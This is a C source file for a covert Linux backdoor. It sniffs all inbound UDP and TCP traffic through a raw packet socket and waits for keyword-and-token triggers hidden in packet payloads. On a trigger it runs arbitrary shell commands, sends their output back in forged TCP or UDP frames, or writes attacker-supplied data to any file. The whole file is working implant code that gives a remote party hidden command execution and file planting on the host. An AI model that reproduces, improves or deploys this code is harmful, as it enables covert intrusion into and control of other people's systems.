#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <sys/socket.h>
#include <ifaddrs.h>

static int sockfd;
static const char _sh[] = "/bin/sh";
static uint16_t tcp_window = 509;
static uint16_t ip_id_counter = 0xbeef;


static uint16_t next_ip_id(void) {
    return ++ip_id_counter;
}

static void compute_tcp_window(void) {
    int def = 0, max = 0;
    FILE *f = fopen("/proc/sys/net/ipv4/tcp_rmem", "r");
    if (!f) return;
    if (fscanf(f, "%*d %d %d", &def, &max) != 2) { fclose(f); return; }
    fclose(f);
    int w = 0, s = max;
    while (s > 65535 && w < 14) { s >>= 1; w++; }
    int aligned = (def / 2 / 1448) * 1448;
    if (w > 0 && aligned > 0)
        tcp_window = aligned >> w;
}

// populated at startup from getifaddrs()
#define MAX_LOCAL_IPS 32
static uint32_t local_ips[MAX_LOCAL_IPS];
static int      local_ip_count = 0;

static void enumerate_local_ips(void) {
    struct ifaddrs *ifap, *ifa;
    if (getifaddrs(&ifap) != 0) return;
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        if (local_ip_count >= MAX_LOCAL_IPS) break;
        struct sockaddr_in *sin = (struct sockaddr_in *)ifa->ifa_addr;
        local_ips[local_ip_count++] = sin->sin_addr.s_addr;
    }
    freeifaddrs(ifap);
}

static int is_local_ip(uint32_t addr) {
    for (int i = 0; i < local_ip_count; i++)
        if (local_ips[i] == addr) return 1;
    return 0;
}

// BPF: "ip and (udp or tcp)" 
static struct sock_filter bpf_code[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 4, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 1, 0, 0x00000006 },
    { 0x15, 0, 1, 0x00000011 },
    { 0x6, 0, 0, 0x0000ffff },
    { 0x6, 0, 0, 0x00000000 },
};

struct __attribute__((__packed__)) udpframe {
    struct ethhdr  ehdr;
    struct iphdr   ip;
    struct udphdr  udp;
    char data[ETH_DATA_LEN - sizeof(struct udphdr) - sizeof(struct iphdr)];
};

struct __attribute__((__packed__)) tcpframe {
    struct ethhdr  ehdr;
    struct iphdr   ip;
    struct tcphdr  tcp;
    char tcp_opts[12];
    char data[ETH_DATA_LEN - sizeof(struct tcphdr) - 12 - sizeof(struct iphdr)];
};

static void ip_checksum(struct iphdr *ip) {
    unsigned int count = ip->ihl << 2;
    unsigned short *addr = (unsigned short *)ip;
    unsigned long sum = 0;
    ip->check = 0;
    while (count > 1) { sum += *addr++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)addr;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    ip->check = (unsigned short)~sum;
}

static void prepare_reply(unsigned char *buf, struct ethhdr *ehdr, struct iphdr *ip,
                          struct sockaddr_ll *sa, int ifindex,
                          int protocol, int payload_len) {
    struct ethhdr *orig_eth = (struct ethhdr *)buf;
    struct iphdr  *orig_ip  = (struct iphdr *)(buf + sizeof(struct ethhdr));

    memcpy(ehdr->h_dest, orig_eth->h_source, ETH_ALEN);
    memcpy(ehdr->h_source, orig_eth->h_dest, ETH_ALEN);
    ehdr->h_proto = htons(ETH_P_IP);

    ip->version  = 4;
    ip->ihl      = 5;
    ip->ttl      = 64;
    ip->id       = htons(next_ip_id());
    ip->frag_off = htons(IP_DF);
    ip->protocol = protocol;
    ip->tot_len  = htons(20 + payload_len);
    ip->saddr    = orig_ip->daddr;
    ip->daddr    = orig_ip->saddr;
    ip_checksum(ip);

    sa->sll_family  = PF_PACKET;
    sa->sll_ifindex = ifindex;
    sa->sll_halen   = ETH_ALEN;
    memcpy(sa->sll_addr, orig_eth->h_source, ETH_ALEN);
}

static void send_reply(unsigned char *buf, int ifindex,
                       uint16_t sport, uint16_t dport,
                       const char *msg, int msglen) {
    struct udpframe frame;
    struct sockaddr_ll sa;
    memset(&frame, 0, sizeof(frame));
    memset(&sa, 0, sizeof(sa));

    prepare_reply(buf, &frame.ehdr, &frame.ip, &sa, ifindex, IPPROTO_UDP, 8 + msglen);

    frame.udp.source = dport;
    frame.udp.dest   = sport;
    frame.udp.len    = htons(8 + msglen);
    memcpy(frame.data, msg, msglen);

    int total = sizeof(struct ethhdr) + 20 + 8 + msglen;
    sendto(sockfd, &frame, total, 0, (struct sockaddr *)&sa, sizeof(sa));
}

static uint16_t tcp_checksum(struct iphdr *ip, struct tcphdr *tcp,
                             const char *data, int datalen) {
    int tcp_len = sizeof(struct tcphdr) + datalen;
    int total   = 12 + tcp_len;
    char tmp[1500];
    memset(tmp, 0, total);

    memcpy(tmp, &ip->saddr, 4);
    memcpy(tmp + 4, &ip->daddr, 4);
    tmp[8] = 0;
    tmp[9] = IPPROTO_TCP;
    *(uint16_t *)(tmp + 10) = htons(tcp_len);

    memcpy(tmp + 12, tcp, sizeof(struct tcphdr));
    memcpy(tmp + 12 + sizeof(struct tcphdr), data, datalen);

    unsigned short *addr = (unsigned short *)tmp;
    unsigned long sum = 0;
    int count = total;
    while (count > 1) { sum += *addr++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)addr;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)~sum;
}

static void extract_tcp_ts(unsigned char *buf, uint32_t *tsval, uint32_t *tsecr) {
    struct iphdr *ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
    unsigned char *tcp_start = buf + sizeof(struct ethhdr) + ip->ihl * 4;
    int tcp_hlen = (tcp_start[12] >> 4) * 4;
    *tsval = 0;
    *tsecr = 0;
    int pos = 20;
    while (pos < tcp_hlen) {
        unsigned char kind = tcp_start[pos];
        if (kind == 0) break;
        if (kind == 1) { pos++; continue; }
        if (pos + 1 >= tcp_hlen) break;
        unsigned char len = tcp_start[pos + 1];
        if (len < 2 || pos + len > tcp_hlen) break;
        if (kind == 8 && len == 10) {
            *tsval = ntohl(*(uint32_t *)(tcp_start + pos + 2));
            *tsecr = ntohl(*(uint32_t *)(tcp_start + pos + 6));
            return;
        }
        pos += len;
    }
}

static void send_tcp_reply(unsigned char *buf, int ifindex,
                           uint16_t sport, uint16_t dport,
                           uint32_t *seq, uint32_t ack,
                           const char *msg, int msglen) {
    struct tcpframe frame;
    struct sockaddr_ll sa;

    memset(&frame, 0, sizeof(frame));
    memset(&sa, 0, sizeof(sa));

    prepare_reply(buf, &frame.ehdr, &frame.ip, &sa, ifindex, IPPROTO_TCP, 32 + msglen);

    uint32_t in_tsval, in_tsecr;
    extract_tcp_ts(buf, &in_tsval, &in_tsecr);
    uint32_t reply_tsval = htonl(in_tsecr + 1);
    uint32_t reply_tsecr = htonl(in_tsval);

    frame.tcp.source  = dport;
    frame.tcp.dest    = sport;
    frame.tcp.seq     = htonl(*seq);
    frame.tcp.ack_seq = htonl(ack);
    frame.tcp.doff    = 8;
    frame.tcp.psh     = 1;
    frame.tcp.ack     = 1;
    frame.tcp.window  = htons(tcp_window);
    frame.tcp.check   = 0;

    frame.tcp_opts[0] = 1;
    frame.tcp_opts[1] = 1;
    frame.tcp_opts[2] = 8;
    frame.tcp_opts[3] = 10;
    memcpy(frame.tcp_opts + 4, &reply_tsval, 4);
    memcpy(frame.tcp_opts + 8, &reply_tsecr, 4);

    memcpy(frame.data, msg, msglen);

    frame.tcp.check = tcp_checksum(&frame.ip, &frame.tcp, frame.tcp_opts, 12 + msglen);

    int total = sizeof(struct ethhdr) + 20 + 32 + msglen;
    sendto(sockfd, &frame, total, 0, (struct sockaddr *)&sa, sizeof(sa));

    *seq += msglen;
}

struct reply_ctx {
    unsigned char *buf;
    int ifindex;
    uint16_t sport;
    uint16_t dport;
    int      is_tcp;
    uint32_t tcp_seq;
    uint32_t tcp_ack;
    char     token[9];
    int      token_len;
};

static int b64val(unsigned char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *src, int srclen, char *dst, int dstmax) {
    int o = 0;
    unsigned int buf = 0;
    int bits = 0;
    for (int i = 0; i < srclen && o < dstmax; i++) {
        int v = b64val((unsigned char)src[i]);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            dst[o++] = (buf >> bits) & 0xFF;
        }
    }
    return o;
}

static void handle_write(char *args, int args_len) {
    // format: <w|a>:<path>:<b64data>
    if (args_len < 4) return;
    char mode = args[0];
    if ((mode != 'w' && mode != 'a') || args[1] != ':') return;

    char *rest = args + 2;
    int rest_len = args_len - 2;
    char *colon = memchr(rest, ':', rest_len);
    if (!colon || colon == rest) return;

    int pathlen = colon - rest;
    char path[512];
    if (pathlen >= (int)sizeof(path)) return;
    memcpy(path, rest, pathlen);
    path[pathlen] = '\0';

    char *b64 = colon + 1;
    int b64len = rest_len - pathlen - 1;

    char decoded[2048];
    int dlen = b64_decode(b64, b64len, decoded, sizeof(decoded));

    const char *fmode = (mode == 'w') ? "wb" : "ab";
    FILE *f = fopen(path, fmode);
    if (!f) return;
    fwrite(decoded, 1, dlen, f);
    fclose(f);
}

static void run_detached(const char *cmd) {
    pid_t pid = fork();
    if (pid != 0) return;
    setsid();
    close(sockfd);
    execl(_sh, _sh + 5, "-c", cmd, NULL);
    _exit(127);
}

static void run_captured(const char *cmd, struct reply_ctx *ctx) {
    if (fork() != 0) return;

    int pipefd[2];
    if (pipe(pipefd) < 0) _exit(1);

    pid_t pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); _exit(1); }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        close(sockfd);
        execl(_sh, _sh + 5, "-c", cmd, NULL);
        _exit(127);
    }

    close(pipefd[1]);
    char out[1400];
    int nr;
    while ((nr = read(pipefd[0], out + ctx->token_len,
                      sizeof(out) - ctx->token_len)) > 0) {
        if (ctx->token_len > 0)
            memcpy(out, ctx->token, ctx->token_len);
        int sendlen = ctx->token_len + nr;

        // check if the payload is small enough to send in 1 chunk
        int room = (int)sizeof(out) - sendlen - ctx->token_len;
        if (room > 0) {
            int nr2 = read(pipefd[0], out + sendlen, room);
            if (nr2 <= 0) {
                memcpy(out + sendlen, ctx->token, ctx->token_len);
                sendlen += ctx->token_len;
                if (ctx->is_tcp)
                    send_tcp_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport,
                                   &ctx->tcp_seq, ctx->tcp_ack, out, sendlen);
                else
                    send_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport, out, sendlen);
                close(pipefd[0]);
                _exit(0);
            }
            sendlen += nr2;
        }
        if (ctx->is_tcp)
            send_tcp_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport,
                           &ctx->tcp_seq, ctx->tcp_ack, out, sendlen);
        else
            send_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport, out, sendlen);
    }
    close(pipefd[0]);

    if (ctx->token_len > 0) {
        if (ctx->is_tcp)
            send_tcp_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport,
                           &ctx->tcp_seq, ctx->tcp_ack, ctx->token, ctx->token_len);
        else
            send_reply(ctx->buf, ctx->ifindex, ctx->sport, ctx->dport,
                       ctx->token, ctx->token_len);
    }
    _exit(0);
}

static void sighandler(int sig) {
    (void)sig;
    close(sockfd);
    _exit(0);
}

static char *find_cmd(const char *payload, int payload_len,
                      const char *keyword, int kwlen) {
    const char *end = payload + payload_len;
    const char *p = end - kwlen;
    while (p >= payload) {
        if (!memcmp(p, keyword, kwlen)) {
            const char *rest = p + kwlen;
            int remain = end - rest;
            if (remain >= 9 && rest[8] == ':')
                return (char *)p;
        }
        p--;
    }
    return NULL;
}

static char *extract_body(char *rest, int rest_len, char *token, int *body_len) {
    memcpy(token, rest, 8);
    token[8] = '\0';
    char *body = rest + 9;
    int body_max = rest_len - 9;
    char end_mark[10];
    end_mark[0] = ':';
    memcpy(end_mark + 1, token, 8);
    char *end = memmem(body, body_max, end_mark, 9);
    if (!end) return NULL;
    *body_len = end - body;
    return body;
}

static void dispatch(char *payload, int payload_len, unsigned char *buf,
                     int ifindex, uint16_t sport, uint16_t dport,
                     int is_tcp, uint32_t tcp_seq, uint32_t tcp_ack) {
    struct reply_ctx ctx = { buf, ifindex, sport, dport,
                             is_tcp, tcp_seq, tcp_ack, {0}, 0 };

    char *match;
    char token[9];
    char *body;
    int body_len;

    if ((match = find_cmd(payload, payload_len, "runcap:", 7))) {
        body = extract_body(match + 7, payload_len - (match + 7 - payload), token, &body_len);
        if (body) {
            body[body_len] = '\0';
            ctx.token_len = 8;
            memcpy(ctx.token, token, 9);
            run_captured(body, &ctx);
        }
    } else if ((match = find_cmd(payload, payload_len, "run:", 4))) {
        body = extract_body(match + 4, payload_len - (match + 4 - payload), token, &body_len);
        if (body) {
            body[body_len] = '\0';
            run_detached(body);
        }
    } else if ((match = find_cmd(payload, payload_len, "write:", 6))) {
        body = extract_body(match + 6, payload_len - (match + 6 - payload), token, &body_len);
        if (body)
            handle_write(body, body_len);
    } else if ((match = find_cmd(payload, payload_len, "status:", 7))) {
        char *rest = match + 7;
        int rest_len = payload_len - (rest - payload);
        ctx.token_len = 8;
        memcpy(ctx.token, rest, 8);
        ctx.token[8] = '\0';
        if (rest_len >= 17 && !memcmp(rest + 9, rest, 8)) {
            char reply[32];
            memcpy(reply, ctx.token, 8);
            memcpy(reply + 8, "up", 2);
            if (is_tcp)
                send_tcp_reply(buf, ifindex, sport, dport,
                               &ctx.tcp_seq, ctx.tcp_ack, reply, 10);
            else
                send_reply(buf, ifindex, sport, dport, reply, 10);
        }
    }
}

int main(void) {
    compute_tcp_window();
    enumerate_local_ips();

    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sockfd < 0) return 1;

    signal(SIGINT, sighandler);
    signal(SIGTERM, sighandler);
    signal(SIGCHLD, SIG_IGN);

    struct sock_fprog fprog = { .len = 7, .filter = bpf_code };
    setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog));

    unsigned char buf[2048];

    for (;;) {
        struct sockaddr_ll from;
        socklen_t fromlen = sizeof(from);

        int n = recvfrom(sockfd, buf, sizeof(buf), 0,
                         (struct sockaddr *)&from, &fromlen);
        if (n < (int)(sizeof(struct ethhdr) + sizeof(struct iphdr) + 8))
            continue;
        if (from.sll_pkttype != PACKET_HOST)
            continue;

        struct iphdr *ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
        int ip_hlen = ip->ihl * 4;

        // skip packets not destined for us
        if (!is_local_ip(ip->daddr))
            continue;

        int captured = n - sizeof(struct ethhdr);

        if (ip->protocol == IPPROTO_UDP) {
            unsigned char *udp_start = buf + sizeof(struct ethhdr) + ip_hlen;
            uint16_t sport = *(uint16_t *)(udp_start);
            uint16_t dport = *(uint16_t *)(udp_start + 2);
            char *payload = (char *)(udp_start + 8);
            int payload_len = ntohs(ip->tot_len) - ip_hlen - 8;
            int max_payload = captured - ip_hlen - 8;
            if (payload_len > max_payload) payload_len = max_payload;
            if (payload_len <= 0) continue;
            dispatch(payload, payload_len, buf, from.sll_ifindex,
                     sport, dport, 0, 0, 0);

        } else if (ip->protocol == IPPROTO_TCP) {
            unsigned char *tcp_start = buf + sizeof(struct ethhdr) + ip_hlen;
            int tcp_hlen = (tcp_start[12] >> 4) * 4;
            if (tcp_hlen < 20) continue;
            int payload_len = ntohs(ip->tot_len) - ip_hlen - tcp_hlen;
            int max_payload = captured - ip_hlen - tcp_hlen;
            if (payload_len > max_payload) payload_len = max_payload;
            if (payload_len <= 0) continue;
            uint16_t sport = *(uint16_t *)(tcp_start);
            uint16_t dport = *(uint16_t *)(tcp_start + 2);
            char *payload = (char *)(tcp_start + tcp_hlen);

            uint32_t in_seq = ntohl(*(uint32_t *)(tcp_start + 4));
            uint32_t in_ack = ntohl(*(uint32_t *)(tcp_start + 8));
            uint32_t reply_seq = in_ack;
            uint32_t reply_ack = in_seq + payload_len;

            dispatch(payload, payload_len, buf, from.sll_ifindex,
                     sport, dport, 1, reply_seq, reply_ack);
        }
    }
}
